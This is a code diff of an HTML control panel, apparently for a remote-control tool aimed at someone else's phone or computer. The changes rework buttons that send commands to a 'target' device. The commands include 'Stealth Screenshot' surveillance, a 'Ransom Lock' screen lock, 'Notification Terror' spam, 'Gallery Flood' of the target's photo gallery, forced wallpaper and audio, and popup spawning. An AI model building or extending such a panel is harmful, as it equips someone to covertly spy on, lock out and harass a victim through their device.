@@ -63,15 +63,33 @@
                 <!-- Command Module: Payload Delivery -->
                 <div class="card span-2">
                     <h3>Asset Deployment</h3>
-                    <div class="upload-area" style="display:flex; gap:10px; margin-bottom: 15px;">
-                        <input type="file" id="mediaUpload" accept="image/*,video/*,audio/*" style="margin:0;"/>
-                        <button class="btn primary" onclick="uploadAndFire()">Blast File</button>
+                    
+                    <!-- Feature: Wallpaper -->
+                    <div style="margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                        <h4 style="color:#0f6; margin-top:0; margin-bottom:5px;">System Wallpaper Injector</h4>
+                        <div class="upload-area" style="display:flex; gap:10px;">
+                            <input type="file" id="uploadWallpaper" accept="image/*" style="margin:0;"/>
+                            <button class="btn primary" onclick="uploadSpecific('uploadWallpaper', 'change_wallpaper')">Bind Wallpaper</button>
+                        </div>
                     </div>
-                    <div class="btn-group">
-                        <button class="btn" onclick="sendCommand('change_wallpaper', { url: window.lastUploadedMedia })">Bind Wallpaper</button>
-                        <button class="btn" onclick="sendCommand('play_audio', { url: window.lastUploadedMedia })">Inject Audio</button>
-                        <button class="btn danger" onclick="sendCommand('stop_audio', null)">Mute</button>
-                        <button class="btn Danger" onclick="sendCommand('flood_gallery', { url: window.lastUploadedMedia })">Gallery Flood</button>
+
+                    <!-- Feature: Audio -->
+                    <div style="margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                        <h4 style="color:#0f6; margin-top:0; margin-bottom:5px;">Audio Injection (MP3)</h4>
+                        <div class="upload-area" style="display:flex; gap:10px;">
+                            <input type="file" id="uploadAudio" accept="audio/*" style="margin:0;"/>
+                            <button class="btn primary" onclick="uploadSpecific('uploadAudio', 'play_audio')">Stream Audio</button>
+                            <button class="btn danger" style="padding:0 10px;" onclick="sendCommand('stop_audio', null)">Mute</button>
+                        </div>
+                    </div>
+
+                    <!-- Feature: Gallery Flood -->
+                    <div>
+                        <h4 style="color:#ff105f; margin-top:0; margin-bottom:5px;">Gallery Flooder Protocol</h4>
+                        <div class="upload-area" style="display:flex; gap:10px;">
+                            <input type="file" id="uploadGallery" accept="image/*" style="margin:0;"/>
+                            <button class="btn danger" onclick="uploadSpecific('uploadGallery', 'flood_gallery')">Flood Target Gallery</button>
+                        </div>
                     </div>
                 </div>
 
@@ -80,18 +98,21 @@
                     <h3>Surveillance & Isolation</h3>
                     <button class="btn secondary full-width" style="margin-bottom:10px" onclick="sendCommand('take_screenshot', null)">Stealth Screenshot</button>
                     
+                    <h4 style="margin-bottom: 5px;">Screen Denial Routines</h4>
                     <div class="btn-group">
-                        <button class="btn danger" onclick="sendCommand('lock_screen', null)">Ransom-Lock</button>
+                        <button class="btn secondary" onclick="sendCommand('native_lock', null)">Native Lock</button>
+                        <button class="btn danger" onclick="sendCommand('lock_screen', null)">Ransom Lock</button>
                         <button class="btn" style="border-color:#0f6" onclick="sendCommand('unlock_screen', null)">Unlock</button>
                     </div>
                     
                     <button class="btn danger full-width" style="margin-top: 10px;" onclick="sendCommand('spam_notifs', null)">Notification Terror</button>
 
                     <h4 style="margin-top: 15px; margin-bottom: 5px;">Floating Popups</h4>
-                    <div class="btn-group">
-                        <button class="btn primary" onclick="sendCommand('spawn_popup', { url: window.lastUploadedMedia })">Spawn Image</button>
-                        <button class="btn danger" onclick="sendCommand('kill_popups', null)">Kill All</button>
+                    <div class="upload-area" style="display:flex; gap:10px; margin-bottom: 10px;">
+                        <input type="file" id="uploadPopup" accept="image/*" style="margin:0; max-width: 60%;"/>
+                        <button class="btn primary" style="flex:1" onclick="uploadSpecific('uploadPopup', 'spawn_popup')">Spawn Image</button>
                     </div>
+                    <button class="btn danger full-width" onclick="sendCommand('kill_popups', null)">Kill All Popups</button>
                 </div>
                 
                 <!-- NEW: Behavioral Modifiers -->
